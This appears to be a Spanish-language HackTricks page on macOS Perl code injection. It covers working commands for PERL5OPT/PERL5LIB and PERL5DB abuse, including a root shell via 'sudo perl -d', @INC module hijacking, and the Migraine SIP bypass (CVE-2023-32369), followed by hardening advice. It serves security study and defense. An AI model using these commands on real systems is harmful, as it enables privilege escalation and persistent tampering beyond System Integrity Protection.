# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via las variables de entorno `PERL5OPT` y `PERL5LIB`

Usando la variable de entorno **`PERL5OPT`**, es posible hacer que **Perl** ejecute comandos arbitrarios cuando el intérprete se inicia (incluso **antes** de que se analice la primera línea del script objetivo).
Por ejemplo, crea este script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Ahora **exporta la variable de entorno** y ejecuta el script de **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Otra opción es crear un módulo de Perl (p. ej., `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Y luego usa las variables de entorno para que el módulo se localice y cargue automáticamente:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Otras variables de entorno interesantes

* **`PERL5DB`**: cuando el intérprete se inicia con la opción **`-d`** (debugger), el contenido de `PERL5DB` se ejecuta como código Perl *dentro* del contexto del debugger.
Si puedes influir tanto en el entorno **como** en las opciones de línea de comandos de un proceso Perl privilegiado, puedes hacer algo como:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`**: en Windows, esta variable controla qué ejecutable de shell utilizará Perl cuando necesite iniciar un shell. Se menciona aquí únicamente por completitud, ya que no es relevante en macOS.

Aunque `PERL5DB` requiere la opción `-d`, es habitual encontrar scripts de mantenimiento o instalación que se ejecutan como *root* con esta opción habilitada para solucionar problemas de forma detallada, lo que convierte a la variable en un vector de escalada válido.

## A través de dependencias (@INC abuse)

Es posible listar la ruta de inclusión que Perl buscará (**`@INC`**) ejecutando:
```bash
perl -e 'print join("\n", @INC)'
```
La salida típica en macOS 13/14 es la siguiente:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Algunas de las carpetas devueltas ni siquiera existen; sin embargo, **`/Library/Perl/5.30`** sí existe, *no* está protegida por SIP y aparece *antes* que las carpetas protegidas por SIP. Por lo tanto, si puedes escribir como *root*, puedes colocar un módulo malicioso (por ejemplo, `File/Basename.pm`) que será cargado *preferentemente* por cualquier script privilegiado que importe ese módulo.

> [!WARNING]
> Aún necesitas **root** para escribir dentro de `/Library/Perl`, y macOS mostrará un aviso de **TCC** solicitando *Full Disk Access* para el proceso que realice la operación de escritura.

Por ejemplo, si un script importa **`use File::Basename;`**, sería posible crear `/Library/Perl/5.30/File/Basename.pm` con código controlado por el atacante.

## SIP bypass via Migration Assistant (CVE-2023-32369 “Migraine”)

En mayo de 2023, Microsoft divulgó **CVE-2023-32369**, apodado **Migraine**, una técnica de post-exploitation que permite a un atacante *root* **bypassear completamente System Integrity Protection (SIP)**.  
El componente vulnerable es **`systemmigrationd`**, un daemon con el entitlement **`com.apple.rootless.install.heritable`**. Cualquier proceso hijo generado por este daemon hereda el entitlement y, por lo tanto, se ejecuta **fuera** de las restricciones de SIP.<sup>[[1]](#references)</sup>

Entre los hijos identificados por los investigadores se encuentra el intérprete firmado por Apple:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Debido a que Perl respeta `PERL5OPT` (y Bash respeta `BASH_ENV`), envenenar el *entorno* del daemon es suficiente para obtener ejecución arbitraria en un contexto sin SIP:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Cuando se ejecuta `migrateLocalKDC`, `/usr/bin/perl` se inicia con el `PERL5OPT` malicioso y ejecuta `/private/tmp/migraine.sh` *antes de que SIP se vuelva a habilitar*. Desde ese script puedes, por ejemplo, copiar un payload dentro de **`/System/Library/LaunchDaemons`** o asignar el extended attribute `com.apple.rootless` para hacer que un archivo sea **imposible de eliminar**.

Apple solucionó el problema en macOS **Ventura 13.4**, **Monterey 12.6.6** y **Big Sur 11.7.7**, pero los sistemas antiguos o sin parches siguen siendo explotables.<sup>[[1]](#references)</sup>

## Recomendaciones de hardening

1. **Borrar las variables peligrosas**: los launchdaemons privilegiados o los trabajos de cron deberían iniciarse con un entorno limpio (`launchctl unsetenv PERL5OPT`, `env -i`, etc.).
2. **Evitar ejecutar interpreters como root** a menos que sea estrictamente necesario. Usar binarios compilados o eliminar privilegios lo antes posible.
3. **Proporcionar scripts con `-T` (taint mode)** para que Perl ignore `PERL5OPT` y otros switches inseguros cuando taint checking está habilitado.
4. **Mantener macOS actualizado**: “Migraine” está completamente parcheado en las versiones actuales.

## Referencias

- [1] [Microsoft Security Blog – Una nueva vulnerabilidad de macOS, Migraine, podría evadir System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
